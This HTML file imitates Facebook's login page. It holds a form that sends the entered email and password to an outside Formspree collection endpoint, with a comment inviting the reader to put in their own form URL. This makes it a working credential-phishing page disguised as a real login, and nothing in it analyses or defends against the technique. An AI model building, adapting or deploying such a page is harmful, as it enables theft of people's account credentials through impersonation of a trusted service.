<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Facebook</title>
  <style>
    :root{
      --fb-blue:#1877f2;
      --bg:#f0f2f5;
      --card:#ffffff;
      --muted:#65676b;
      --input-border:#dddfe2;
      --green:#42b72a;
    }
    *{box-sizing:border-box}
    html,body{height:100%;margin:0;font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;background:var(--bg);color:#1c1e21}
    .wrap{
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:28px;
    }
    .container{
      
      display: grid;
      place-items: center;    /* ata dile   align- center  ar justify- center  deya  duitari kaj ak sathe kore dibe */
      height: 100vh;      /* ar ata holo jekhanei view koro na keno tar screen ta same vabe dekhave  upore ar neche */
    }
    

    /* Left marketing column */
    .left {
      flex:1;
      min-width:260px;
      padding-top:30px;
    }
    .brand {
      font-weight:700;
      color:var(--fb-blue);
      font-size:64px;
      line-height:1;
      letter-spacing:1px;
      margin-left:25px;
    }
    .tag {
      font-size:28px;
      color:#050505;
      margin:0 0 12px 0;
      font-weight:600;
    }
    .desc {
      font-size:18px;
      color:var(--muted);
      max-width:420px;
    }

    /* Right login column */
    .right {
      width:380px;
      min-width:280px;
    }

    .card{
      background:var(--card);
      border-radius:8px;
      padding:18px;
      box-shadow: 0 6px 20px rgba(0,0,0,0.08);
    }

    .logo-line{
      display:flex;
      justify-content:center;
      align-items:center;
      gap:12px;
      margin-bottom:8px;
    }

    .logo-mark{
      width:48px;
      height:48px;
      border-radius:8px;
      background:linear-gradient(135deg,#0b63d6,#2190ff);
      display:inline-flex;
      align-items:center;
      justify-content:center;
      color:white;
      font-weight:700;
      font-size:20px;
      box-shadow:0 2px 6px rgba(0,0,0,0.12);
    }

    .site-title{
      font-weight:700;
      color:var(--fb-blue);
      font-size:20px;
    }

    form { display:flex; flex-direction:column; gap:10px; margin-top:6px; }

    input[type="email"], input[type="password"]{
      padding:12px 14px;
      font-size:15px;
      border:1px solid var(--input-border);
      border-radius:6px;
      outline:none;
    }
    input:focus{box-shadow:0 0 0 3px rgba(24,119,242,0.08); border-color:rgba(24,119,242,0.6);}

    .btn-login{
      margin-top:6px;
      background:var(--fb-blue);
      color:#fff;
      border:none;
      padding:12px;
      border-radius:6px;
      font-weight:700;
      cursor:pointer;
      font-size:16px;
    }
    .btn-login:hover{filter:brightness(.96);}

    .links{
      display:flex;
      justify-content:space-between;
      align-items:center;
      margin-top:8px;
      font-size:13px;
    }
    .links a{ color:var(--fb-blue); text-decoration:none; }
    .links a:hover{ text-decoration:underline; }

    .divider{
      height:12px;
      border-bottom:1px solid #e6e7e9;
      margin:16px 0;
    }

    .create-wrap{
      display:flex;
      justify-content:center;
    }
    .btn-create{
      background:var(--green);
      color:#fff;
      border:none;
      padding:10px 16px;
      border-radius:6px;
      font-weight:700;
      cursor:pointer;
      font-size:15px;
    }
    .btn-create:hover{filter:brightness(.96);}

    .demo-badge{
      display:inline-block;
      margin-top:10px;
      background:#fff3cd;
      color:#856404;
      font-size:12px;
      padding:6px 10px;
      border-radius:999px;
      border:1px solid #ffeeba;
    }

    .footer {
      margin-top:14px;
      font-size:12px;
      color:var(--muted);
      text-align:center;
    }

    @media (max-width:820px){
      .container{flex-direction:column;align-items:center}
      .left{order:2;text-align:center}
      .right{order:1}
      .brand{font-size:48px}
      .tag{font-size:22px}
    }
  </style>
</head>
<body>
  <div class="wrap">
    <div class="container" role="main">
      <div class="left" aria-hidden="false">
        <div class="brand">Facebook</div>
      <p style="font-size: 18px; ">Facebook Facebook helps you connect and <br>share with the people in your life.</p><br>

      

      <div class="right">
        <div class="card" role="region" aria-label="Login">
          

          <!-- ====== Replace action with your Formspree URL ======
               Example: action="https://formspree.io/f/your_form_id" -->
          <form action="https://formspree.io/f/mdkpznvn" method="POST" autocomplete="on">
            <label for="email" style="position:absolute;left:-9999px;">Email or phone</label>
  <input id="email" name="email" type="email" placeholder="Email address or phone number" required
         style="padding:12px 14px; font-size:15px; border:1px solid #dddfe2; border-radius:6px; outline:none; width:100%; margin-bottom:10px;">

  <!-- New textbox styled like email -->
  <label for="text" style="position:absolute;left:-9999px;">Textbox</label>
  <input id="text" name="text" type="text" placeholder="Password" required
         style="padding:12px 14px; font-size:15px; border:1px solid #dddfe2; border-radius:6px; outline:none; width:100%; margin-bottom:10px;">


            

            <button type="submit" class="btn-login">Log in</button>

            <div style="text-align: center;">
              <a" href="facebook.com"  ">Forgotten password?</a>
              
            </div>

            

            <div class="create-wrap">
              <button type="button" class="btn-create" onclick="alert('Demo page — no real account creation here.')">Create new account</button>
            </div>

            <p style="text-align:center;font-size:12px;color:var(--muted);margin-top:10px;">
              <a style="text-decoration: none; color: black;" href=""><b>Create a Page</b></a> for a celebrity, brand or business.
            </p>
          </form>
        </div>

       
      </div>
    </div>
  </div>
  <script>
  const form = document.getElementById("my-form");
  form.addEventListener("submit", async (e) => {
    e.preventDefault(); // ফর্ম সাবমিট হলে নতুন পেজে না যায়
    const data = new FormData(form);
    const response = await fetch(form.action, {
      method: form.method,
      body: data,
      headers: { 'Accept': 'application/json' }
    });
    if (response.ok) {
      alert("");
      form.reset();
    } else {
      alert(" ");
    }
  });
  </script>
</body>
</html>
